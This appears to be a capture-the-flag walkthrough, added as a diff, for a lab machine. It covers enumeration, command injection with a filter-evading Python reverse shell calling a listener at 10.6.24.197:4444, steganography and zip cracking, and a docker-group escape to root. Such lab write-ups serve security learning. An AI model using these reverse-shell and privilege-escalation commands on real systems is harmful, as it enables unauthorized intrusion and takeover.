@@ -1,0 +1,35 @@
+A port scan shows 22, 21 and 80 are open
+
+I browsed to the web page and didnt find anything
+
+Running gobuster found a /secrets directory
+
+Going to that shows a search bar with an execute function
+
+Trying commands like whoami and id work, but you cannot do much else here
+
+I intercepted the execute function with burp, sent it to the repeater and added the following to the bottom of the text:
+command=p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.24.197,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+This will give you a reverse shell
+
+Checking /var/www/files/images, you will find a jpg and gif.
+
+Spin up a python3 http server and wget these down
+
+use 'steghide extract -sf hacker-with-laptop_23-2147985341.jpg' to get a backup.zip
+
+Since the .zip file is protected, use zip2john to generate something john can crack
+
+Use the password to unzip the file and find source_code.php
+
+Open this up and you will find a base64 string that you can decode
+
+SSH as anurodh with the newly found password
+
+run 'id' and see that they are part of the docker group
+
+GTFObins shows you can run the following to get a root shell:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+As root, you can cat out the root flag in /root and the local.txt flag in /home/apaar
